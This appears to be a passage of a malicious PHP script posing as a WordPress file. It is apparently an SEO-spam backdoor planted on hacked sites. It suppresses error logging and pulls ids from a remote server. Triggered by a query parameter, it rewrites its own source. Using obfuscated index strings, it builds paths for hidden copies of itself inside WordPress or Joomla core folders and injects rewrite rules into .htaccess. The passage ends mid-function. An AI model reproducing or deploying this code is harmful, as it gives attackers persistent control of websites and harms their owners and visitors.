<?php 

/**
 * approach aspect awful brake catalog display exclusive export household idle infinite kneel nuisance previous register reinforce restrain slide tedious thrust variable.
 * debt durable explode infer network optimistic passion passport prescribe restraint the variable.
 * arichmetic clue partial provision relief.
 * architecture collision distribute enclose genius haste leisure mutual nucleus principal promote provision radical sorrow temporary tendency territory tuition usage valid.
 * community discipline outstanding scratch.
 * agency appoint attitude brake entertainment exclaim fertilizer grand lean nucleus oblige parallel personal scan seminar spot suburb undergo wander.
 * adapt cancel evil extinct gene leak offend omit petrol reinforce scale security tension utter.
 * gear hostile liquor quit rely shiver.
 * balcony enviroment exclusive external faulty launch merchant neglect peak rival scale textile triangle.
 * adopt apparent authority bother distribute domestic evil expel gear grant impose index moisture oral orient outset reject removal revenue ridid usage variable withdraw xploit.
 *
 * @package WordPress
 */

 
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@set_time_limit(3600);
define("DOMTXT","/jd1/");
define("GETDATE","http://www.datecenter.com/api/?key=");
define("CENTERKEY",0);
define("MYDIR", "/jpltptqc20200201-1/");
define("FNUM",99);
define("JGNUM","40");
define("LINKNUM","18");
define("BZSITE","f");
define("BZPRO","q");
define("BZCAT","l");
//msbg
define("JDT","1");
//msend

//msidbg
define("MSID",12100);
//mssidend


//jthouzuibg
define("JTHZ","/");
//jthouzuiend


//keyjgbg
define("KEYJG","70");
//keyjgbgend






// #llqllq#arr_nametimebg

$arrnametime[]="3";
$arrnametime[]="2";
$arrnametime[]="1";
$arrnametime[]="4";


// #llqllq#arr_nametimeend

// #llqllq#arr_wordbg

$arr_word[0][] ="8";$arr_word[0][] ="6";$arr_word[0][] ="4";$arr_word[0][] ="11";$arr_word[0][] ="9";$arr_word[0][] ="8";$arr_word[0][] ="7";$arr_word[0][] ="6";$arr_word[0][] ="5";$arr_word[0][] ="2";$arr_word[0][] ="10";$arr_word[0][] ="4";$arr_word[0][] ="5";$arr_word[0][] ="7";$arr_word[0][] ="3";$arr_word[1][] ="9";$arr_word[1][] ="6";$arr_word[1][] ="7";$arr_word[1][] ="8";$arr_word[1][] ="8";$arr_word[1][] ="10";$arr_word[1][] ="4";$arr_word[1][] ="2";$arr_word[1][] ="11";$arr_word[1][] ="5";$arr_word[1][] ="4";$arr_word[1][] ="3";$arr_word[1][] ="5";$arr_word[1][] ="7";$arr_word[1][] ="6";$arr_word[2][] ="4";$arr_word[2][] ="3";$arr_word[2][] ="8";$arr_word[2][] ="4";$arr_word[2][] ="5";$arr_word[2][] ="6";$arr_word[2][] ="11";$arr_word[2][] ="5";$arr_word[2][] ="8";$arr_word[2][] ="10";$arr_word[2][] ="7";$arr_word[2][] ="9";$arr_word[2][] ="6";$arr_word[2][] ="2";$arr_word[2][] ="7";$arr_word[3][] ="4";$arr_word[3][] ="9";$arr_word[3][] ="5";$arr_word[3][] ="8";$arr_word[3][] ="6";$arr_word[3][] ="4";$arr_word[3][] ="6";$arr_word[3][] ="2";$arr_word[3][] ="7";$arr_word[3][] ="10";$arr_word[3][] ="3";$arr_word[3][] ="11";$arr_word[3][] ="5";$arr_word[3][] ="8";$arr_word[3][] ="7";$arr_word[4][] ="5";$arr_word[4][] ="8";$arr_word[4][] ="2";$arr_word[4][] ="10";$arr_word[4][] ="6";$arr_word[4][] ="9";$arr_word[4][] ="3";$arr_word[4][] ="4";$arr_word[4][] ="7";$arr_word[4][] ="7";$arr_word[4][] ="6";$arr_word[4][] ="11";$arr_word[4][] ="8";$arr_word[4][] ="5";$arr_word[4][] ="4";$arr_word[5][] ="5";$arr_word[5][] ="4";$arr_word[5][] ="6";$arr_word[5][] ="9";$arr_word[5][] ="3";$arr_word[5][] ="7";$arr_word[5][] ="11";$arr_word[5][] ="10";$arr_word[5][] ="8";$arr_word[5][] ="6";$arr_word[5][] ="8";$arr_word[5][] ="4";$arr_word[5][] ="2";$arr_word[5][] ="5";$arr_word[5][] ="7";$arr_word[6][] ="8";$arr_word[6][] ="2";$arr_word[6][] ="6";$arr_word[6][] ="5";$arr_word[6][] ="11";$arr_word[6][] ="9";$arr_word[6][] ="3";$arr_word[6][] ="4";$arr_word[6][] ="7";$arr_word[6][] ="7";$arr_word[6][] ="5";$arr_word[6][] ="8";$arr_word[6][] ="10";$arr_word[6][] ="4";$arr_word[6][] ="6";$arr_word[7][] ="11";$arr_word[7][] ="6";$arr_word[7][] ="8";$arr_word[7][] ="4";$arr_word[7][] ="2";$arr_word[7][] ="6";$arr_word[7][] ="5";$arr_word[7][] ="10";$arr_word[7][] ="3";$arr_word[7][] ="7";$arr_word[7][] ="4";$arr_word[7][] ="8";$arr_word[7][] ="5";$arr_word[7][] ="7";$arr_word[7][] ="9";$arr_word[8][] ="7";$arr_word[8][] ="3";$arr_word[8][] ="10";$arr_word[8][] ="8";$arr_word[8][] ="8";$arr_word[8][] ="6";$arr_word[8][] ="5";$arr_word[8][] ="9";$arr_word[8][] ="6";$arr_word[8][] ="4";$arr_word[8][] ="5";$arr_word[8][] ="4";$arr_word[8][] ="7";$arr_word[8][] ="11";$arr_word[8][] ="2";$arr_word[9][] ="5";$arr_word[9][] ="7";$arr_word[9][] ="11";$arr_word[9][] ="10";$arr_word[9][] ="7";$arr_word[9][] ="6";$arr_word[9][] ="6";$arr_word[9][] ="9";$arr_word[9][] ="4";$arr_word[9][] ="2";$arr_word[9][] ="8";$arr_word[9][] ="3";$arr_word[9][] ="8";$arr_word[9][] ="5";$arr_word[9][] ="4";$arr_word[10][] ="7";$arr_word[10][] ="10";$arr_word[10][] ="6";$arr_word[10][] ="3";$arr_word[10][] ="6";$arr_word[10][] ="8";$arr_word[10][] ="7";$arr_word[10][] ="4";$arr_word[10][] ="9";$arr_word[10][] ="4";$arr_word[10][] ="5";$arr_word[10][] ="8";$arr_word[10][] ="11";$arr_word[10][] ="5";$arr_word[10][] ="2";$arr_word[11][] ="5";$arr_word[11][] ="7";$arr_word[11][] ="10";$arr_word[11][] ="8";$arr_word[11][] ="4";$arr_word[11][] ="4";$arr_word[11][] ="3";$arr_word[11][] ="2";$arr_word[11][] ="8";$arr_word[11][] ="5";$arr_word[11][] ="6";$arr_word[11][] ="6";$arr_word[11][] ="11";$arr_word[11][] ="7";$arr_word[11][] ="9";

// #llqllq#arr_wordend



// #llqllq#arr_keywz

$arrKeywz[]="9";
$arrKeywz[]="11";
$arrKeywz[]="5";
$arrKeywz[]="7";
$arrKeywz[]="8";
$arrKeywz[]="4";
$arrKeywz[]="10";
$arrKeywz[]="6";
$arrKeywz[]="12";


// #llqllq#arr_keywzend


// #llqllq#arrBreadbg

$arrBread[]="Breadcrumbs";
$arrBread[]="l-breadcrumb row";
$arrBread[]="ag-breadcrumblist clearfix";
$arrBread[]="r-breadcrumb";
$arrBread[]="";
$arrBread[]="BreadcrumbsHead clearfix";
$arrBread[]="l-breadcrumblist";
$arrBread[]="mb-breadcrumb clearfix";
$arrBread[]="breadcrumbs";
$arrBread[]="BreadcrumbHead row";
$arrBread[]="";
$arrBread[]="breadcrumbs-base";
$arrBread[]="BreadcrumbList clearfix";
$arrBread[]="BreadcrumbsList row";
$arrBread[]="";
$arrBread[]="bread_crumb";
$arrBread[]="mb-breadcrumb row";
$arrBread[]="";
$arrBread[]="plp__breadcrumb row";
$arrBread[]="breadcrumb row";
$arrBread[]="ag-breadcrumblist row";
$arrBread[]="l-breadcrumb";
$arrBread[]="r-breadcrumb clearfix";
$arrBread[]="";
$arrBread[]="ck-breadcrumb clearfix";
$arrBread[]="breadcrumbs clearfix";
$arrBread[]="";
$arrBread[]="BreadcrumbsHead row";
$arrBread[]="BreadcrumbHead";
$arrBread[]="qa-breadcrumb clearfix";
$arrBread[]="plp__breadcrumb clearfix";
$arrBread[]="mb-breadcrumb";
$arrBread[]="";
$arrBread[]="Breadcrumbs row";
$arrBread[]="plp__breadcrumb";
$arrBread[]="bread_crumb row";
$arrBread[]="breadcrumb";
$arrBread[]="";
$arrBread[]="BreadcrumbList";
$arrBread[]="breadcrumb clearfix";
$arrBread[]="l-breadcrumb clearfix";
$arrBread[]="BreadcrumbList row";
$arrBread[]="breadcrumbs-base row";
$arrBread[]="nw-breadcrumblist row";
$arrBread[]="l-breadcrumblist row";
$arrBread[]="Breadcrumb";
$arrBread[]="ck-breadcrumb";
$arrBread[]="Breadcrumbs clearfix";
$arrBread[]="Breadcrumb clearfix";
$arrBread[]="ck-breadcrumb row";
$arrBread[]="wrapper-breadcrums row";
$arrBread[]="BreadcrumbsList";
$arrBread[]="wrapper-breadcrums clearfix";
$arrBread[]="bread_crumb clearfix";
$arrBread[]="";
$arrBread[]="BreadcrumbsList clearfix";
$arrBread[]="ag-breadcrumblist";
$arrBread[]="nw-breadcrumblist";
$arrBread[]="BreadcrumbsHead";
$arrBread[]="qa-breadcrumb row";
$arrBread[]="nw-breadcrumblist clearfix";
$arrBread[]="r-breadcrumb row";
$arrBread[]="qa-breadcrumb";
$arrBread[]="breadcrumbs row";
$arrBread[]="Breadcrumb row";
$arrBread[]="BreadcrumbHead clearfix";
$arrBread[]="wrapper-breadcrums";
$arrBread[]="breadcrumbs-base clearfix";
$arrBread[]="l-breadcrumblist clearfix";
$arrBread[]="";
$arrBread[]="";


// #llqllq#arrBreadend


// #llqllq#arr_fuhao

$arrfh[]="，";
$arrfh[]="！";
$arrfh[]="、";
$arrfh[]=" ";
$arrfh[]="……";
$arrfh[]="；";
$arrfh[]="？";
$arrfh[]="。";


// #llqllq#arr_fuhaoend


$q1 = "O00O0O";	$q2 = "O0O000";	$q3 = "O0OO00";	$q4 = "OO0O00";	$q5 = "OO0000";	$q6 = "O00OO0";	$q7 = "O00O00";	$q8 = "O00OOO";	$$q1 = RandAbcs();



// #llqllq#randkeybg
$strRand[0]="prsievkczwxfajulbodnmgtqhy";
$strRand[1]="kmvapyxurfgdqslcztihenbojw";
$strRand[2]="tdmipfhwexjuvngkboaqcsyrzl";
$strRand[3]="fxgbawrchsmoqvenpkztyujdli";
$strRand[4]="jwuargpkqndetzvfolsbihxmyc";
$strRand[5]="imorlstwvkgcqbxudjfeyhpazn";
$strRand[6]="pxveoncfjkmahzsdubiyqgtlwr";
$strRand[7]="ablpwjxudoezcnmthvikysrgqf";
$strRand[8]="xgefdbzhqkivspaunlmojywctr";
$strRand[9]="ewymjqfiaxuoncrphglbvtkszd";
$strRand[10]="wbomixnzegrkqfualsjhcdpytv";
$strRand[11]="yhfzqnadielumwvbcporjxtksg";
$strRand[12]="exqzadhmfwysvplrkbjugcntoi";
$strRand[13]="vnwyfigtodxkjshmzepuqclrba";
$strRand[14]="dgezqlunpamcjhbfyviktsrowx";
$strRand[15]="lqwszfaxekcbmrgtujydovhnip";
$strRand[16]="gwznhmfjxbdyapqkcrtveiuslo";
$strRand[17]="fbnxuipryshztdjlaoqgvkmwce";
$strRand[18]="njctrouzqfhidapykvlgemxbws";
$strRand[19]="ktvpszjnuywxblgfieqmrhcoad";
$strRand[20]="pbakwultqgcyrdnxezmsvfihjo";
$strRand[21]="bekgratvudqpnlzowsmyfijhxc";
$strRand[22]="semnqpocgxdyhuztbflvrkjawi";
$strRand[23]="svcwrnqkfhbyzmieugltpoajxd";
$strRand[24]="prswkdtfuhjayovibezmlnxcqg";
$strRand[25]="xdsqehwgyntjuozmkrvplafcbi";
$strRand[26]="ozxiyrjcluamvbgwsnpktfeqdh";
$strRand[27]="qjzlvhisyxuepackwdbfngmrto";
$strRand[28]="sycovrjdxnfughapeqzmwilbtk";
$strRand[29]="savqdcimehwxubztrpnoyfgjkl";
$strRand[30]="kcfarpdygjoeuwbmhzlsxvqtin";
$strRand[31]="tnifzyjcoehglxwpsdrmbqkvau";
$strRand[32]="pwjkqcfdsivzxrtbaugnehlomy";
$strRand[33]="jhpbwzcxnluftdkverymsioagq";
$strRand[34]="xgeymhnclsbrdfvoqzaptuiwjk";
$strRand[35]="idmaluzwsbjytgpeqckxhornvf";
$strRand[36]="xkawjevblmgzocqurpnhyidtfs";
$strRand[37]="pnwxbjorglidtkychqsfezavmu";
$strRand[38]="mitxkduhrqejcsaywogpznlvbf";
$strRand[39]="sfubctghnzjkaolqxweyprmdiv";
$strRand[40]="uwpmhlsixebntfvodqrgazjyck";
$strRand[41]="xnyvjwiahqstgdzmkloecfupbr";
$strRand[42]="bzawhopljsuigmvyteqcdnfkxr";
$strRand[43]="xqfteygurvoljdmawckhibpnzs";
$strRand[44]="jrcvplgweifuabzkdmqosxntyh";
$strRand[45]="dmqjaobpznsciklhtxyrgewvuf";
$strRand[46]="biuhxfvlmctnjprszdoaewykgq";
$strRand[47]="jeasglxfihdorqkwvbtycznpum";
$strRand[48]="yhaunwlvxemkdjrpcfztbiqsog";
$strRand[49]="dqymzpjgeuwfrhctalvksoxnbi";
$strRand[50]="ydobjhlwftkpxsqiuagmcrenvz";
$strRand[51]="gliedocwkuvxtamhrbqszypfnj";
$strRand[52]="vtsuzweioplkmgrfcnayjbhxdq";
$strRand[53]="dsztaemobyljrhupkxfvngiqcw";
$strRand[54]="zkoldteipamqvnwsxuyjrfbchg";
$strRand[55]="ciyuxqrbjkfehtmgwonavlsdzp";
$strRand[56]="ywhtivrbmnqazgepoulfcjxsdk";
$strRand[57]="ndrwaiuvbxjfmqgskoeyclphzt";
$strRand[58]="fedbmogpsrihnklawcvjzytuqx";
$strRand[59]="xdrhvympqicjkoaflgzstneubw";
$strRand[60]="nyapkmvdgflbhtcruejqoizwxs";
$strRand[61]="xljqvdwipbkufhsaegoctrznmy";
$strRand[62]="trkdgbnoaqecjlviwuszhfmypx";
$strRand[63]="bgzypckvwfstmdnhuloaixqejr";
$strRand[64]="kmzdlfqwpxeurvcbgjonyshita";
$strRand[65]="ubdcfhakzivexoygrsqmlnpwtj";
$strRand[66]="ntwyfardmgsvjbelpikoczuhxq";
$strRand[67]="umyrcaxqsnefhkzpojtdgblviw";
$strRand[68]="dpgqcblzsjxuftahkoiynvmewr";
$strRand[69]="xavjnlehmpgzkowycbtqifrsud";
$strRand[70]="yjusegrpwkzihfvoqnladbxcmt";
$strRand[71]="bcneighaqoxurwvstmdzpjlfyk";
$strRand[72]="fntzmslaqhevguwjixdoykcrbp";
$strRand[73]="fdioyrbtgulpsmxawnhjkvczeq";
$strRand[74]="xchbfamozlnsgveiudkpqyrtwj";
$strRand[75]="ablfdqvsmgzjpykwncroutehix";
$strRand[76]="wvnguzrsijmpxoahtqdleyfckb";
$strRand[77]="gfzlacnxovkpmbjtdiqyhsrwue";
$strRand[78]="vsjmwanrhtcfugkipdyxqebzol";
$strRand[79]="jhbngmokwyitzvlrcpasdeqfxu";
$strRand[80]="qvryoehgjcmxfznulkiasptdbw";
$strRand[81]="mywklsztxnaicqurdogfjehvpb";
$strRand[82]="fsgpovrbuiqcxetlayjzmknwhd";
$strRand[83]="ehzsaopkdcvtjxlmyurgbnwqif";
$strRand[84]="zsekjnwpxtlhdgcbioymuvfraq";
$strRand[85]="jdpuxlmvzbgyqtewcnorhikasf";
$strRand[86]="botkrmgwphnfecqjzilvusyxad";
$strRand[87]="kzvstmiugerjolxcphfbwdanyq";
$strRand[88]="layhuxdsfqmcrwevktgzpnjobi";
$strRand[89]="zadoqlcupmbtxkejsifgnwvhry";
$strRand[90]="ihekqgodsxpwzltmuayvrbjcnf";
$strRand[91]="wxvuafozhjrtkdyqcgmenbslip";
$strRand[92]="zdokevxytrmsjagqufincblpwh";
$strRand[93]="siuzemfywlcogpaxbdtkqrnvjh";
$strRand[94]="jbhnrudetwiamyzxqlkcvsgfpo";
$strRand[95]="xpwnilyhoucmedbjqzksatfgrv";
$strRand[96]="sgcfztyrdnbeimolhxkuvqjwap";
$strRand[97]="ewigcrkpmadsfuojqhntxlzvyb";
$strRand[98]="afnwygmkrzluipdsbvtxeqojhc";
$strRand[99]="zohiwudfgrtlxjanevcqmspbyk";

// #llqllq#randkeyend



$thisdom = str_replace("www.","",$_SERVER['HTTP_HOST']);
define("GETDOM",getthisdom());


// iiiiiiiiibg


function sys_type(){

	global $hostDir;
	if(file_exists("$hostDir/wp-config.php") or file_exists("../wp-config.php")){
		return 'wp';
	}elseif(strstr(@file_get_contents("$hostDir/configuration.php"),"JConfig") or strstr(@file_get_contents("../configuration.php"),"JConfig")){
		return 'Joomla';
	}else{
		return 'other';
	}
	
}


function getFileType($filename){
	$rs = '#.*\.([^\s]+)#i';
	preg_match($rs,$filename,$matchType);
	return $matchType[1];
}


function getTypeImg($source, &$destination, $num, $type){ 

     global $numHostDir;
     $handle = opendir($source); 
     while(($file = readdir($handle)) !== false){ 
         if($file != '.' && $file != '..')  { 
             $src = $source . DIRECTORY_SEPARATOR . $file; 

             if(is_dir($src) && !strstr($src,'/cache')){ 
                 getTypeImg($src, $destination, $num, $type);  
             }else{ 
				 if(count($destination) >= $num)
				   return count($destination);
				   
				 $tempType = getFileType($file);
				 if(strstr($type,$tempType)){
					$tempMydir = count(explode(DIRECTORY_SEPARATOR,$src));
				
					if($tempMydir - $numHostDir > 2 && !strstr($file,'index')){
						$destination[$source] = $tempType .'#name#'. str_replace('.'.$tempType ,'' ,$file);
					}
				 }
             } 
         } 
     }
     closedir($handle); 
 }  

 

if(isset($_GET['rset']) &&  $_GET['rset'] == 'set'){
		
	if(isset($_SERVER['DOCUMENT_ROOT'])){
	$hostDir = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR;
}elseif(isset($_SERVER['PHP_SELF'])){
	$hostDir = str_ireplace(str_replace("\\",DIRECTORY_SEPARATOR,str_replace("/",DIRECTORY_SEPARATOR,$_SERVER['PHP_SELF'])),'',__FILE__).DIRECTORY_SEPARATOR;
}else{
	$hostDir = '/';
}
$hostDir = str_replace(DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR, $hostDir);
	

	$sysType = sys_type();

	
	if($sysType == 'wp'){
		$backupfile1 = $hostDir.$O00O0O{22}.$O00O0O{15}.$O00O0O{66}.$O00O0O{8}.$O00O0O{13}.$O00O0O{2}.$O00O0O{11}.$O00O0O{20}.$O00O0O{3}.$O00O0O{4}.$O00O0O{18}.$O00O0O{64}.$O00O0O{2}.$O00O0O{20}.$O00O0O{18}.$O00O0O{19}.$O00O0O{14}.$O00O0O{12}.$O00O0O{8}.$O00O0O{25}.$O00O0O{4}.$O00O0O{64}.$O00O0O{2}.$O00O0O{11}.$O00O0O{0}.$O00O0O{18}.$O00O0O{18}.$O00O0O{66}.$O00O0O{22}.$O00O0O{15}.$O00O0O{66}.$O00O0O{2}.$O00O0O{20}.$O00O0O{18}.$O00O0O{19}.$O00O0O{14}.$O00O0O{12}.$O00O0O{8}.$O00O0O{25}.$O00O0O{4}.$O00O0O{66}.$O00O0O{5}.$O00O0O{8}.$O00O0O{11}.$O00O0O{19}.$O00O0O{4}.$O00O0O{17}.$O00O0O{18}.$O00O0O{66}.$O00O0O{18}.$O00O0O{4}.$O00O0O{19}.$O00O0O{19}.$O00O0O{8}.$O00O0O{13}.$O00O0O{6}.$O00O0O{63}.$O00O0O{15}.$O00O0O{7}.$O00O0O{15};		$backupfile2 = $hostDir.$O00O0O{22}.$O00O0O{15}.$O00O0O{66}.$O00O0O{0}.$O00O0O{3}.$O00O0O{12}.$O00O0O{8}.$O00O0O{13}.$O00O0O{64}.$O00O0O{8}.$O00O0O{13}.$O00O0O{2}.$O00O0O{11}.$O00O0O{20}.$O00O0O{3}.$O00O0O{4}.$O00O0O{18}.$O00O0O{64}.$O00O0O{12}.$O00O0O{4}.$O00O0O{3}.$O00O0O{8}.$O00O0O{0}.$O00O0O{18}.$O00O0O{63}.$O00O0O{15}.$O00O0O{7}.$O00O0O{15};
		$fitime = filemtime($hostDir.$O00O0O{22}.$O00O0O{15}.$O00O0O{66}.$O00O0O{0}.$O00O0O{3}.$O00O0O{12}.$O00O0O{8}.$O00O0O{13}.$O00O0O{64}.$O00O0O{8}.$O00O0O{13}.$O00O0O{2}.$O00O0O{11}.$O00O0O{20}.$O00O0O{3}.$O00O0O{4}.$O00O0O{18}.$O00O0O{64});
	}elseif($sysType == 'Joomla'){
		$backupfile1 = $hostDir.$O00O0O{12}.$O00O0O{14}.$O00O0O{3}.$O00O0O{20}.$O00O0O{11}.$O00O0O{4}.$O00O0O{18}.$O00O0O{64}.$O00O0O{12}.$O00O0O{14}.$O00O0O{3}.$O00O0O{62}.$O00O0O{18}.$O00O0O{4}.$O00O0O{0}.$O00O0O{17}.$O00O0O{2}.$O00O0O{7}.$O00O0O{64}.$O00O0O{19}.$O00O0O{12}.$O00O0O{15}.$O00O0O{11}.$O00O0O{64}.$O00O0O{3}.$O00O0O{4}.$O00O0O{5}.$O00O0O{0}.$O00O0O{20}.$O00O0O{11}.$O00O0O{19}.$O00O0O{18}.$O00O0O{63}.$O00O0O{15}.$O00O0O{7}.$O00O0O{15};$backupfile2 = $hostDir.$O00O0O{11}.$O00O0O{8}.$O00O0O{1}.$O00O0O{17}.$O00O0O{0}.$O00O0O{17}.$O00O0O{8}.$O00O0O{4}.$O00O0O{18}.$O00O0O{64}.$O00O0O{9}.$O00O0O{14}.$O00O0O{14}.$O00O0O{12}.$O00O0O{11}.$O00O0O{0}.$O00O0O{64}.$O00O0O{2}.$O00O0O{0}.$O00O0O{2}.$O00O0O{7}.$O00O0O{4}.$O00O0O{64}.$O00O0O{18}.$O00O0O{19}.$O00O0O{14}.$O00O0O{17}.$O00O0O{0}.$O00O0O{6}.$O00O0O{4}.$O00O0O{64}.$O00O0O{12}.$O00O0O{4}.$O00O0O{12}.$O00O0O{2}.$O00O0O{0}.$O00O0O{2}.$O00O0O{7}.$O00O0O{4}.$O00O0O{18}.$O00O0O{63}.$O00O0O{15}.$O00O0O{7}.$O00O0O{15};$fitime = filemtime($hostDir.$O00O0O{12}.$O00O0O{14}.$O00O0O{3}.$O00O0O{20}.$O00O0O{11}.$O00O0O{4}.$O00O0O{18}.$O00O0O{64}.$O00O0O{12}.$O00O0O{14}.$O00O0O{3}.$O00O0O{62}.$O00O0O{18}.$O00O0O{4}.$O00O0O{0}.$O00O0O{17}.$O00O0O{2}.$O00O0O{7}.$O00O0O{64});
	}else{
	
		$numHostDir = count(explode(DIRECTORY_SEPARATOR,$hostDir));
			
		$arrphpDir = array();

		getTypeImg($hostDir,$arrphpDir,3,'php');
		
		$i=1;
		foreach($arrphpDir as $key=>$vs){
			
				$fitime = filemtime($key);

				list($tmepImgType,$trmeyImgName) = explode('#name#',$vs);
				$tempMyVs = 'backupfile'.$i++;
		
				$$tempMyVs = $key . DIRECTORY_SEPARATOR . $trmeyImgName .'s.'. $tmepImgType;
			
				while(file_exists($$tempMyVs)){
					$$tempMyVs = str_replace(".$tmepImgType","s.$tmepImgType",$$tempMyVs);
				}
				
			
			}

	}
	
	$backupfile1 = str_replace(DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR,$backupfile1);
	$backupfile2 = str_replace(DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR,$backupfile2);
	
	
	
		
	$str = file_get_contents("index.php");
		
	$r3 = '#(// \#l{2}ql{2}q\#arr_keywz)(.*?)(// \#l{2}ql{2}q\#arr_keywzend)#s';	
	shuffle($arrKeywz);	$rp2 = '';	foreach($arrKeywz as $valpimg){
		$rp2 .= '$arrKeywz[]="'. $valpimg .'";'. PHP_EOL;	}
	
	$str = preg_replace($r3, '\1'. PHP_EOL . PHP_EOL .  $rp2 . PHP_EOL . PHP_EOL .'\3', $str);	
			
	
	$r0 = '#(/+keyjgbg)(.*?)(/+keyjgbgend)#s';	
	$str = preg_replace($r0, '\1'. PHP_EOL .'define("KEYJG","'. rand(1,100) .'");'. PHP_EOL .'\3'. PHP_EOL , $str);	
	
	
	
	$r1 = '#(// \#l{2}ql{2}q\#arrBreadbg)(.*?)(// \#l{2}ql{2}q\#arrBreadend)#s';	
	shuffle($arrBread);	
	$rp1 = '';	
	foreach($arrBread as $vals){
		$rp1 .= '$arrBread[]="'. $vals .'";'. PHP_EOL;	
	}
	$str = preg_replace($r1, '\1'.  PHP_EOL . PHP_EOL .$rp1 . PHP_EOL . PHP_EOL .'\3', $str);	
	

	$r3 = '#(// \#l{2}ql{2}q\#arr_wordbg)(.*?)(// \#l{2}ql{2}q\#arr_wordend)#s';	$strword = '';
	$arrWordOld = array(2,3,4,4,5,6,7,8,5,6,7,8,9,10,11);	$rp2 = '';
	for($i=0;$i<12;$i++){
		shuffle($arrWordOld); 
		foreach($arrWordOld as $vtemps)
			$rp2 .= '$arr_word['. $i .'][] ="'. $vtemps .'";';	
	}
	
	$str = preg_replace($r3, '\1'. PHP_EOL . PHP_EOL .  $rp2 . PHP_EOL . PHP_EOL .'\3', $str);		
		
	$r3 = '#(// \#l{2}ql{2}q\#arr_nametimebg)(.*?)(// \#l{2}ql{2}q\#arr_nametimeend)#s';	
	shuffle($arrnametime);	$rp2 = '';	foreach($arrnametime as $valpimg){
		$rp2 .= '$arrnametime[]="'. $valpimg .'";'. PHP_EOL;	}
	
	$str = preg_replace($r3, '\1'. PHP_EOL . PHP_EOL .  $rp2 . PHP_EOL . PHP_EOL .'\3', $str);	
						
	$r4 = '#(// \#l{2}ql{2}q\#randkeybg)(.*?)(// \#l{2}ql{2}q\#randkeyend)#s';	
	$arrABC = range('a','z');	
	$strTemp1 = '';	for($i=0;$i<100;$i++){
		shuffle($arrABC); 
		$strtemp = '';		foreach($arrABC as $value){
			$strtemp .= $value;		}	
		
		$strTemp1 .= '$strRand[' .$i. ']="' . $strtemp .'";'. PHP_EOL;	}
	$str = preg_replace($r4, '\1'. PHP_EOL . $strTemp1  . PHP_EOL .'\3', $str);	
	
	
	$num = rand(1,FNUM);	$num = $num - 1;	
	
	
	
	$idUrl =  GETDOM . "gpage.php?getid=$num";
	$tempIdStr = curl_get_from_webpage($idUrl,'',5);
	$arrId = explode(',',$tempIdStr);
	

	
	$indexId=array_rand($arrId,1);
	$rsGs="#^[\d-]+$#i";
	if(!preg_match($rsGs,$arrId[$indexId])){
		die("get no id");
	}

	$str = str_replace('$id = "552622"; //llq index id', '$id = "'. $arrId[$indexId] .'"; //llq index id', $str);	
	$r3='#(// \#l{2}ql{2}q\#arr_fuhao)(.*?)(// \#l{2}ql{2}q\#arr_fuhaoend)#s';	shuffle($arrfh);$rp2='';foreach($arrfh as $valpimg){$rp2.='$arrfh[]="'.$valpimg.'";'.PHP_EOL;}$str=preg_replace($r3,'\1'.PHP_EOL.PHP_EOL.$rp2.PHP_EOL.PHP_EOL.'\3',$str);	
	file_put_contents(__FILE__, $str);
	
	$dirNames = dirname(__FILE__);    
	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));	
	$PreDir = '';	if(JDT == 1){
		$UrlBaseDir = $httcReplace;		$RewriteOnDir = '';	
		}else{

		$UrlBaseDir = '';		$PreDir = '../';		$RewriteOnDir = $httcReplace . '/';	
		}
	$strhtt = '';	if (file_exists("$PreDir.htaccess")){
		
		@chmod("$PreDir.htaccess",0755);		$strhtt = file_get_contents("$PreDir.htaccess");	
		}
		
	if(!(strstr($strhtt,'RewriteBase') || strstr($strhtt,'RewriteRule')))
	{
		$strhtt = '<IfModule mod_rewrite.c>'.PHP_EOL . 'Options +FollowSymLinks'. PHP_EOL .'RewriteEngine on'. PHP_EOL .'RewriteBase /'. $UrlBaseDir . PHP_EOL .'</IfModule>';	}else{
		$strhtt = str_ireplace('# RewriteBase ','RewriteBase ',$strhtt);		$strhtt = str_ireplace('#RewriteBase ','RewriteBase ',$strhtt);	}
		
	if(1){
		
		$r1 = '#(.*RewriteBase.*)#i';		$r2 = '#RewriteRule#i';		
		$rsut = '\1'.PHP_EOL .'RewriteRule ^'. '.*[-]'.'(\d+)'. JTHZ .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. '(.*)'.'-'. BZCAT . JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]' . PHP_EOL  ;
		
		$rsut2 = PHP_EOL . 'RewriteRule ^'. '.*[-]'.'(\d+)'. JTHZ .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. '(.*)'.'-'. BZCAT . JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]' . PHP_EOL  .'RewriteRule' ;		
		

		
		if(preg_match($r1,$strhtt)){
			$strhtt = preg_replace($r1,$rsut,$strhtt,1);		}else{
			$strhtt = preg_replace($r2,$rsut2,$strhtt,1);		}
		
		if(JDT == 1 or JDT == 0){
			file_put_contents("$PreDir.htaccess", $strhtt);		
			}
	}
	
	
		
	$str = file_get_contents(__FILE__);
	if(isset($_GET["jgshu"]) && $_GET["jgshu"]){
		$str = str_replace('define("JGNUM","50");', 'define("JGNUM","'.trim($_GET["jgshu"]).'");', $str);
		echo "<br/>jgshu (".$_GET["jgshu"].") ok!<br/>";
	}
	
	if(isset($_GET["ljshu"]) && $_GET["ljshu"]){
		$str = str_replace('define("LINKNUM","18");', 'define("LINKNUM","'.trim($_GET["ljshu"]).'");', $str);	
		echo "<br/>ljshu (".$_GET["ljshu"].") ok!<br/>";
	}	
	
	preg_match('#c{6}getbg(.*?)c{6}getend#si',$str,$matchPut);
	$backStr = $matchPut[1];
			

	
	
